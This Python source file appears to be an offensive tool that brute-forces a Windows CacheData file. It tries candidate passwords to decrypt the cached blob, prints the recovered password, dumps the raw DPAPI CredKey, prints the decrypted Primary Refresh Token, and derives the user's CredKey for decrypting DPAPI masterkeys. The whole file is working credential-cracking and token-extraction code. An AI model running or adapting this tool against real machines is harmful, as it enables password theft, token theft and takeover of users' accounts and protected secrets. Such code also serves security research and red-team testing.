import json
import hmac
import hashlib
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from typing import List
from scripts.parse_cachedata import CacheDataNode, parse_cache_data
from scripts.dpapi_cred_key import DPAPICredKeyBlob
import struct
import hexdump

def bruteforce(arguments):
    file_path = arguments.CacheData
    cache_data_node_list : List[CacheDataNode] = parse_cache_data(file_path)
    cache_data_node_password = None
    for entry in cache_data_node_list:
        if entry.is_node_type_password():
            cache_data_node_password = entry
            break
    if cache_data_node_password is None:
        raise Exception('No node of type password (0x1) found in CacheData file')
    print('[+] CacheData node of type password (0x1) has been found')
    enc_data = cache_data_node_password.encryptedPRTBlob
    success = False
    for password in arguments.passwords:
        if arguments.verbose:
            print("Trying: " + password + "\n")
        password_array = password.encode('utf-16-le')
        secret = get_pbkdf2(password_array)
        if arguments.verbose:
            print(secret)
        default_iv = b'\x00' * 16
        decrypted_blob = aes_decrypt(enc_data,secret,default_iv)
        version, flags, dword3, raw_dpapi_cred_key_size = struct.unpack("<IIII", decrypted_blob[0:0x10])
        if version == 0x00:
            decrypted_prt = decrypted_blob[0x70:]
            if not decrypted_prt.startswith(b'{"Version"'):
                continue
            print(f"[+] Password: '{password}'")
            success = True
            dpapi_cred_key_blob = decrypted_blob[0x10:0x10+raw_dpapi_cred_key_size]
            dpapi_cred_key_blob_obj = DPAPICredKeyBlob(dpapi_cred_key_blob)
            print(f'[+] Dumping raw DPAPI Cred key, with GUID {dpapi_cred_key_blob_obj.Guid} (0x40 bytes):')
            hexdump.hexdump(dpapi_cred_key_blob_obj.CredKey)
            # Remove encryption padding
            decrypted_prt_end = decrypted_prt.rfind(b'}')
            assert decrypted_prt_end != -1
            decrypted_prt = decrypted_prt[:decrypted_prt_end+1]
            print("[+] Dumping decrypted PRT file:")
            prt_dict = json.loads(decrypted_prt)
            print(json.dumps(prt_dict, indent=4))
            # Derive the CredKey. Serves as the base secret to decrypt the masterkeys of the user.
            key = hashlib.sha1(dpapi_cred_key_blob_obj.CredKey).digest()
            sid = prt_dict['UserInfo']['PrimarySid']
            encoded_sid = (sid + '\0').encode('UTF-16-LE')
            key = hmac.new(key, encoded_sid, hashlib.sha1).hexdigest()
            print(f'[+] Derived CredKey: {key} for sid: {sid}')
            break
    if not success:
        print('[+] End of bruteforce, no valid password found.')


def get_pbkdf2(password, salt=b'', iterations=10000):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=iterations,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key


def aes_decrypt(encrypted_data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    return decrypted_data
